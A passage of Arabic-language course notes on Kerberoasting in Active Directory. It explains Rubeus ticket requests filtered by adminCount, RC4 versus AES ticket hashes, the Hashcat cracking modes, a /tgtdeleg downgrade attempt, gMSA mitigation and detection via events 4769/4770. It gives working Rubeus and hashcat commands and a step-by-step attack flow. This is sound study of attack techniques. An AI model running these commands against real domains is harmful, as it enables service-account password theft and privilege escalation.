+```text
+Password Last Set:
+2010
+```
+
+ده ممكن يكون interesting لأن password قديمة جدًا.
+
+لكن:
+
+> ده مش معناه تلقائيًا إن password ضعيفة.
+
+هو مجرد indicator يستحق التحقيق.
+
+---
+
+### 22. `admincount=1`
+
+المثال يستخدم:
+
+```powershell
+Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+يعني:
+
+> اطلب TGS فقط للحسابات اللي `adminCount = 1`.
+
+وده بيفلتر الحسابات اللي Active Directory يعتبرها مرتبطة بحسابات/مجموعات إدارية محمية.
+
+في المثال:
+
+```text
+Total kerberoastable users : 3
+```
+
+ومنهم:
+
+```text
+backupagent
+```
+
+وده أحسن من إنك تبدأ بـ 50 أو 100 account وتعمل cracking لكل حاجة.
+
+---
+
+### 23. أهم جزء: Encryption Types
+
+دي نقطة مهمة جدًا.
+
+Kerberos ممكن يستخدم encryption types مختلفة.
+
+في الجزء ده أهم 3:
+
+|Type|Encryption|
+|---|---|
+|23|RC4-HMAC|
+|17|AES128|
+|18|AES256|
+
+وعشان كده الـ hash بيبدأ مثلًا:
+
+```text
+$krb5tgs$23$
+```
+
+أو:
+
+```text
+$krb5tgs$18$
+```
+
+---
+
+## 24. ليه RC4 أسهل في الـ Cracking؟
+
+الـ TGS نفسه مش هو password.
+
+الفكرة إن الـ TGS-REP يحتوي بيانات مشفرة باستخدام secret مرتبط بالـ service account.
+
+فلو حصلنا على الـ TGS:
+
+```text
+TGS
+ ↓
+Offline password guessing
+```
+
+### RC4
+
+أسرع في cracking.
+
+Hashcat:
+
+```text
+13100
+```
+
+### AES256
+
+أبطأ بكثير.
+
+Hashcat:
+
+```text
+19700
+```
+
+وده لا يعني إن AES مستحيل يتكسر.
+
+لو password:
+
+```text
+welcome1
+```
+
+مثلًا، فممكن تتكسر.
+
+لكن لو password قوية وعشوائية:
+
+```text
+long-random-unique-secret...
+```
+
+الـ offline attack يبقى أصعب جدًا.
+
+---
+
+## 25. `msDS-SupportedEncryptionTypes`
+
+ده Attribute في Active Directory بيحدد الـ encryption types المدعومة للحساب.
+
+في المثال:
+
+```text
+0
+```
+
+معناه حسب الـ source:
+
+```text
+default behavior
+→ RC4_HMAC_MD5
+```
+
+وبالتالي:
+
+```text
+Rubeus
+ ↓
+TGS
+ ↓
+$krb5tgs$23$
+```
+
+---
+
+بعد تعديل الحساب:
+
+```text
+msDS-SupportedEncryptionTypes = 24
+```
+
+المثال يوضح إن:
+
+```text
+24
+```
+
+يعني:
+
+```text
+AES128
++
+AES256
+```
+
+فبقى الـ hash:
+
+```text
+$krb5tgs$18$
+```
+
+---
+
+## 26. AES256 Hashcat
+
+لما نشوف:
+
+```text
+$krb5tgs$18$
+```
+
+نستخدم:
+
+```bash
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+الفرق في السرعة كان واضح جدًا في المثال:
+
+```text
+RC4:
+~693 kH/s
+
+AES256:
+~10 kH/s
+```
+
+يعني AES أبطأ بحوالي عشرات المرات في المثال.
+
+وده سبب إن استخدام AES بيصعّب Kerberoasting، **لكن لا يمنعه**.
+
+---
+
+## 27. `/tgtdeleg` — محاولة الحصول على RC4
+
+Rubeus عنده:
+
+```text
+/tgtdeleg
+```
+
+الفكرة في المثال:
+
+```text
+Account supports AES
+        ↓
+Normally → AES TGS
+        ↓
+/tgtdeleg
+        ↓
+Request RC4
+```
+
+وده مهم لأن:
+
+```text
+RC4 → cracking أسرع
+AES → cracking أبطأ
+```
+
+لكن فيه نقطة مهمة جدًا في الـ source:
+
+> السلوك ده يعتمد على إصدار Domain Controller.
+
+المثال يوضح أن الطريقة دي لا تعمل بنفس الشكل مع **Windows Server 2019 DC**؛ وفي الحالة دي الـ DC يرجع أعلى encryption type مدعوم للحساب.
+
+فما تحفظش:
+
+```text
+/tgtdeleg = always downgrade AES → RC4
+```
+
+احفظ:
+
+> `tgtdeleg` technique مرتبطة بقدرة/سلوك الـ DC والـ account encryption configuration.
+
+---
+
+## 28. Mitigation
+
+لو عندك Service Account عادي:
+
+أكبر مشكلة:
+
+```text
+SPN
++
+Password ضعيفة
+```
+
+الحل الأساسي:
+
+### Password قوية
+
+Password طويلة وعشوائية ومش موجودة في wordlists.
+
+لكن الأفضل للـ service accounts:
+
+### MSA / gMSA
+
+خصوصًا:
+
+```text
+gMSA
+```
+
+لأن Windows يدير password معقدة ويعمل لها rotation تلقائي.
+
+فبدل:
+
+```text
+sqlservice
+Password: Summer2020!
+```
+
+يبقى الحساب managed والـ password مش أنت اللي بتديرها يدويًا.
+
+---
+
+## 29. Detection
+
+Kerberoasting يعتمد على طلب:
+
+```text
+TGS
+```
+
+فممكن تراقب Kerberos service-ticket activity.
+
+أهم Event هنا:
+
+```text
+4769
+```
+
+معناه:
+
+> Kerberos service ticket was requested.
+
+وكذلك:
+
+```text
+4770
+```
+
+يعني:
+
+> Kerberos service ticket was renewed.
+
+لو مستخدم عادي فجأة بيطلب عدد كبير من TGS tickets في فترة قصيرة، ده ممكن يكون indicator.
+
+لكن خلي بالك:
+
+> وجود 4769 لوحده مش معناه Kerberoasting.
+
+لأن TGS requests طبيعية جدًا في Active Directory.
+
+المهم هو **pattern والسياق**.
+
+---
+
+## 30. الصورة الكاملة للجزء ده
+
+احفظها بالشكل ده:
+
+```text
+              Windows Host
+                   │
+                   ▼
+             Enumerate SPNs
+                   │
+          ┌────────┴────────┐
+          │                 │
+       setspn            PowerView
+          │                 │
+          └────────┬────────┘
+                   ▼
+             Service Account
+                   │
+                   ▼
+                Request
+                 TGS
+                   │
+          ┌────────┴────────┐
+          │                 │
+      Manual route       Rubeus
+          │                 │
+      Mimikatz              │
+          │                 │
+        .kirbi              │
+          │                 │
+     kirbi2john             │
+          │                 │
+          └────────┬────────┘
+                   ▼
+             Hashcat format
+                   │
+                   ▼
+                Hashcat
+                   │
+          ┌────────┴────────┐
+          │                 │
+       RC4 23            AES256 18
+       13100               19700
+          │                 │
+          └────────┬────────┘
+                   ▼
+              Password
+                   │
+                   ▼
+          Check privileges/access
+```
+
+## أهم حاجة تخرج بيها من الـ Module
+
+**Kerberoasting مش معناه "سرقة باسورد من Kerberos".**
+
+أنت بتعمل:
+
+```text
+1. Find SPN
+2. Identify service account
+3. Request TGS legitimately
+4. Get encrypted TGS
+5. Take it offline
+6. Crack it
+7. Recover service-account password
+8. Use privileges of that account
+```
+
+والـ Windows section هنا بيوريك **3 مستويات من التنفيذ**:
+
+```text
+Manual:
+setspn + PowerShell + Mimikatz
+
+Semi-automated:
+PowerView
+
+Automated:
+Rubeus
+```
+
+والـ أهم concept في آخر الجزء:
+
+```text
+RC4  → $krb5tgs$23$ → Hashcat 13100 → أسرع
+AES  → $krb5tgs$18$ → Hashcat 19700 → أبطأ
+```
+
+وبعد ما تطلع الـ credentials، **Kerberoasting خلص**؛ الخطوة التالية هي تحديد إيه الـ access والـ privileges اللي الحساب ده بيديك إياها: RDP/WinRM، SMB، MSSQL، local admin، أو أحيانًا privileges أعلى.
+
+
+
+# Layer 19
+
